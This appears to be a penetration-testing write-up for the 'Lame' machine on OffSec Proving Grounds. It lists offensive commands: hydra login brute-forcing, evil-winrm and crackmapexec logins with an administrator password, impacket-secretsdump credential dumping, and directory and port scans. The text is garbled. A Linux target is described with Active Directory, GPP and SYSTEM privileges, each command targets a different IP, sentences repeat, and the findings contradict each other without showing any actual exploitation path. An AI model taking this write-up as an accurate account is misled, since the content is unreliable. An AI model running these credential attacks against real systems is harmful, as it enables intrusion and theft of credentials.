---
TitleSEO: "OffSec Proving Grounds — Lame (Medium Linux) | ZureFX"
TitlePost: "OffSec Proving Grounds — Lame (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Lame. Subdomain Takeover and Command Injection to achieve medium compromise on Linux."
Keywords: "hard, forensics, windows, medium, ctf, active directory"
URL: "https://zurefx.github.io/writeups/htb-lame-868.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-lame-868/"
Date: "2024-12-31"
Tags: "Hard, Forensics, Windows, Medium, CTF, Active Directory"
Section: "writeups"
Lang: "en"
main_img: "htb-lame-868"
Permalink: "/writeups/htb-lame-868.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Lame** is rated **Medium** on OffSec Proving Grounds. It runs **Linux** and the IP address during this analysis was `10.118.101.130`.

### Objectives

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.88.144.68/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.25.55 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.102.92.210/FUZZ
```

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

### Service Enumeration

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
gobuster dir -u http://10.58.243.200/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p3306,9200,995 10.72.226.32 -oN scan.txt
evil-winrm -i 10.17.204.242 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.46.85.51 -u administrator -p 'P@ssw0rd!' --shares
```

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI).

### SMB Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. The service account had excessive permissions assigned in Active Directory.

```bash
nmap -sCV -p8888,587,1521 10.20.204.60 -oN scan.txt
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code.

## Exploitation

### Vulnerability Identification

The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service.

Key finding: **Subdomain Takeover**.

The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials.

### Initial Access

Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
crackmapexec smb 10.110.126.30 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.22.203.172 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.79.70.113
```

The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials.

## Privilege Escalation

### Enumeration

The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible.

```bash
crackmapexec smb 10.121.204.171 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.110.62.121/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.31.214.230 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.119.193 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Lateral movement was facilitated by reusing discovered credentials across services. The database credentials were hardcoded in the application source code.

```bash
gobuster dir -u http://10.32.238.13/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory.

## Summary

### Tools Used

- `hydra`
- `wpscan`
- `smbclient`
- `impacket`
- `secretsdump`
- `burpsuite`
- `sqlmap`

### Key Takeaways

- Subdomain Takeover
- Command Injection
